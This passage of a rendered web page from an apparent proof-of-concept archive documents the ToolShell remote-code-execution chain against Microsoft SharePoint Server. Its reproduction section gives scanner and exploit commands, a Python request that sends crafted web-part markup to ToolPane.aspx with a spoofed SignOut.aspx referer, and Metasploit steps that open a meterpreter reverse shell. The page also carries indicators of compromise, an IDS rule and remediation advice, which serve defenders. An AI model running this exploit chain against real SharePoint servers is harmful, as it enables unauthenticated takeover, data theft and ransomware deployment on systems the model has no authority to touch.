+<h2 id="environment--lab-setup">Environment / Lab Setup</h2>
+<pre tabindex="0"><code>OS:          Windows Server 2019
+Target:      SharePoint Server 2019 (16.0.10337.12109 RTM or 16.0.10417.20018 June 2025 patch)
+Attacker:    Kali Linux / any system with Python 3 + requests
+Tools:       Python 3, requests, urllib3; Metasploit Framework (for .rb module)
+</code></pre><h3 id="setup-steps">Setup Steps</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip install requests urllib3
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python scanner/scanner.py http://&lt;sharepoint-host&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python exploit/exploit.py &lt;sharepoint-host-or-ip&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<h3 id="step-by-step-reproduction">Step-by-Step Reproduction</h3>
+<ol>
+<li>
+<p><strong>Scan for vulnerability</strong> - Identify patch level via <code>siteClientTag</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python scanner/scanner.py http://192.168.1.100
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>Send exploit payload</strong> - POST crafted DWP markup triggering deserialization</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python exploit/exploit.py 192.168.1.100
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>Metasploit module</strong> - Full shell via TypeConfuseDelegate + LosFormatter chain</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/windows/http/sharepoint_toolpane_rce
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 192.168.1.100
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> PAYLOAD cmd/windows/http/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<h3 id="exploit-code">Exploit Code</h3>
+<blockquote>
+<p>See <code>exploit/exploit.py</code>, <code>scanner/scanner.py</code>, <code>analysis/analyse.py</code>, and <code>metasploit_ref/sharepoint_toolpane_rce.rb</code> in this folder.</p></blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/_layouts/15/ToolPane.aspx/x?DisplayMode=Edit&amp;y=/ToolPane.aspx&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;/_layouts/SignOut.aspx&#39;</span><span class="p">,</span> <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;MSOTlPn_Uri=...&amp;MSOTlPn_DWP=&lt;ExcelDataSet CompressedDataTable=&#39;&lt;gadget&gt;&#39; runat=&#39;server&#39;/&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="expected-output">Expected Output</h3>
+<pre tabindex="0"><code>[+] Targeting: http://192.168.1.100
+[+] Sending exploit payload...
+[+] Response Status: 200
+[+] Response Length: 1234 bytes
+[+] Request completed successfully
+</code></pre><hr>
+<h2 id="screenshots--evidence">Screenshots / Evidence</h2>
+<!-- Add paths to screenshots or embed them -->
+<ul>
+<li>No screenshots included in upstream repo.</li>
+</ul>
+<hr>
+<h2 id="detection--indicators-of-compromise">Detection &amp; Indicators of Compromise</h2>
+<pre tabindex="0"><code>POST /_layouts/15/ToolPane.aspx/* ?DisplayMode=Edit
+Referer: /_layouts/SignOut.aspx
+Content-Type: application/x-www-form-urlencoded
+Body contains: MSOTlPn_DWP, ExcelDataSet, CompressedDataTable
+</code></pre><p><strong>SIEM / IDS Rule (example):</strong></p>
+<pre tabindex="0"><code>alert http any any -&gt; any 80 (msg:&#34;ToolShell SharePoint RCE Attempt CVE-2025-49706&#34;; content:&#34;POST&#34;; http_method; content:&#34;/ToolPane.aspx&#34;; http_uri; content:&#34;DisplayMode=Edit&#34;; http_uri; content:&#34;SignOut.aspx&#34;; http_header; content:&#34;MSOTlPn_DWP&#34;; http_client_body; sid:9000010;)
+</code></pre><hr>
+<h2 id="remediation">Remediation</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Action</th>
+          <th>Detail</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Patch</strong></td>
+          <td>Apply Microsoft security update addressing CVE-2025-53770 and CVE-2025-53771 (August 2025 CU or later for SharePoint 2019). Check MSRC advisories for exact build numbers.</td>
+      </tr>
+      <tr>
+          <td><strong>Workaround</strong></td>
+          <td>Perform the manual SharePoint configuration update described in <a href="https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/">https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/</a> — patching alone is insufficient without the config update.</td>
+      </tr>
+      <tr>
+          <td><strong>Config Hardening</strong></td>
+          <td>Restrict inbound access to SharePoint <code>/_layouts/</code> paths at the network perimeter; enable extended protection for authentication on IIS; block external access to SharePoint admin endpoints.</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770">CVE-2025-53770 (MSRC)</a></li>
+<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53771">CVE-2025-53771 (MSRC)</a></li>
+<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49704">CVE-2025-49704 (MSRC)</a></li>
+<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49706">CVE-2025-49706 (MSRC)</a></li>
+<li><a href="https://blog.viettelcybersecurity.com/sharepoint-toolshell/">Viettel Cyber Security - ToolShell Technical Analysis</a></li>
+<li><a href="https://securelist.com/toolshell-explained/">Kaspersky - ToolShell Explained</a></li>
+<li><a href="https://blog.leakix.net/2025/07/using-their-own-weapons-for-defense-a-sharepoint-story/">LeakIX - In-the-wild exploit capture</a></li>
+<li><a href="https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/">Microsoft Security Blog - Disrupting active exploitation</a></li>
+<li><a href="https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/">Microsoft Customer Guidance</a></li>
+<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-580/">ZDI-25-580</a></li>
+<li><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-581/">ZDI-25-581</a></li>
+<li><a href="https://github.com/saladin0x1/CVE-2025-53770">Source repo: https://github.com/saladin0x1/CVE-2025-53770</a></li>
+</ul>
+<hr>
+<h2 id="notes">Notes</h2>
+<p>Actively exploited in the wild as a zero-day since at least July 19, 2025. Attributed to China-nexus APT groups Linen Typhoon (APT27) and Violet Typhoon (APT31) and the ransomware operator Storm-2603. The CVE-2025-53770 designation is a patch bypass of CVE-2025-49704 targeting a different <code>/_vti_bin/</code> endpoint; the Metasploit module (included here) exploits the ToolPane endpoint chain (CVE-2025-49704 + CVE-2025-49706). The July 2025 patch alone is insufficient — a manual SharePoint configuration update must also be applied. Repo contains Python exploit, scanner, payload analyser, and a full Metasploit module with the DataSet + TypeConfuseDelegate + LosFormatter gadget chain. Stars: 4. Language: Ruby (primary), Python.</p>
+<p>Auto-ingested from <a href="https://github.com/saladin0x1/CVE-2025-53770">https://github.com/saladin0x1/CVE-2025-53770</a> on 2026-05-17.</p>
+
+    </div>
+
+    
+    <nav class="mt-12 grid grid-cols-1 gap-3 border-t border-zinc-200 pt-6 sm:grid-cols-2 dark:border-zinc-800">
+      
+        <a href="/poc-archive/pocs/binary/2026-05-17_windows-kernel-eop-cve-2025-62215/" class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-zinc-800">
+          <span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">← previous in web</span>
+          <span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Windows Kernel Elevation of Privilege - Race Condition / Double-Free (CVE-2025-62215)</span>
+        </a>
+      
+      
+        <a href="/poc-archive/pocs/web/2026-05-17_react2shell-rce/" class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-zinc-800">
+          <span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">next in web →</span>
+          <span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">React2Shell - Next.js RSC Unauthenticated RCE</span>
+        </a>
+      
+    </nav>
+  </div>
+
+  
+  <aside class="hidden lg:order-2 lg:block">
+    <div class="sticky top-20"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40">
+  
+
+  <dl class="space-y-3 font-mono text-xs">
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Severity</dt>
+      <dd class="mt-1"><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-red-500/40 bg-red-500/10 text-red-500 dark:text-red-400">
+  <span class="h-1.5 w-1.5 rounded-full bg-current"></span>Critical
+</span>
+</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">CVE</dt>
+      <dd class="mt-1 text-emerald-600 dark:text-emerald-400">CVE-2025-53770, CVE-2025-53771, CVE-2025-49704, CVE-2025-49706</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Category</dt>
+      <dd class="mt-1">
+        <a href="/pocs/web/" class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">web</a>
+      </dd>
+    </div>
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">Microsoft SharePoint Server</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">SharePoint Server 2019 (16.0.10337.12109 through 16.0.10417.20027); SharePoint Subscription Edition (16.0.14326.20450 through 16.0.18526.20424); SharePoint 2016 (16.0.4351.1000 through 16.0.5508.1000)</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-05-17</dd>
+    </div>
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt>
+      <dd class="mt-1">
+        <span class="text-emerald-600 dark:text-emerald-400">patched</span>
+      </dd>
+    </div>
+  </dl>
+
+  
+  <div>
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p>
+    <div class="mt-2 flex flex-wrap gap-1.5">
+      
+      <a href="/tags/rce/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#RCE</a>
+      
+      <a href="/tags/sharepoint/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#SharePoint</a>
+      
+      <a href="/tags/unauthenticated/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#unauthenticated</a>
+      
+      <a href="/tags/deserialization/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#deserialization</a>
+      
+      <a href="/tags/auth-bypass/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#auth-bypass</a>
+      
+      <a href="/tags/apt27/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#APT27</a>
+      
+      <a href="/tags/apt31/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#APT31</a>
+      
+      <a href="/tags/ransomware/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#ransomware</a>
+      
+      <a href="/tags/windows/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#Windows</a>
+      
+      <a href="/tags/iis/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#IIS</a>
+      
+    </div>
+  </div>
+  
+
+  
+  <div>
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p>
+    <ul class="mt-2 space-y-1.5">
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53771" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53771</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49704" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49704</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49706" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49706</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://blog.viettelcybersecurity.com/sharepoint-toolshell/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://blog.viettelcybersecurity.com/sharepoint-toolshell/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://securelist.com/toolshell-explained/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://securelist.com/toolshell-explained/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://blog.leakix.net/2025/07/using-their-own-weapons-for-defense-a-sharepoint-story/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://blog.leakix.net/2025/07/using-their-own-weapons-for-defense-a-sharepoint-story/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://www.zerodayinitiative.com/advisories/ZDI-25-580/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.zerodayinitiative.com/advisories/ZDI-25-580/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://www.zerodayinitiative.com/advisories/ZDI-25-581/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.zerodayinitiative.com/advisories/ZDI-25-581/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://github.com/saladin0x1/CVE-2025-53770" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/saladin0x1/CVE-2025-53770</a>
+      </li>
+      
+    </ul>
+  </div>
+  <div class="border-t border-zinc-200 pt-4 dark:border-zinc-800">
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p>
+    <a href="https://github.com/intelseclab/poc-archive/tree/master/pocs/web/2026-05-17_toolshell-sharepoint-chain/" target="_blank" rel="noopener noreferrer"
+       class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">
+      <svg class="h-3.5 w-3.5 flex-shrink-0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+      intelseclab/poc-archive
+    </a>
+  </div>
+</div>
+</div>
+  </aside>
+</article>
+
+  </main>
+  <footer class="mt-16 border-t border-zinc-200 dark:border-zinc-800">
+  <div class="mx-auto flex w-full max-w-6xl flex-col gap-2 px-4 py-8 text-xs text-zinc-500 sm:flex-row sm:items-center sm:justify-between sm:px-6 lg:px-8 dark:text-zinc-500">
+    <p class="font-mono">
+      PoC Archive — research artifacts for defensive and educational use only.
+    </p>
+    <p class="font-mono">
+      built with <a href="https://gohugo.io" class="text-emerald-600 hover:underline dark:text-emerald-400">hugo</a> · deployed on github pages
+    </p>
+  </div>
+</footer>
+
+</body>
+</html>
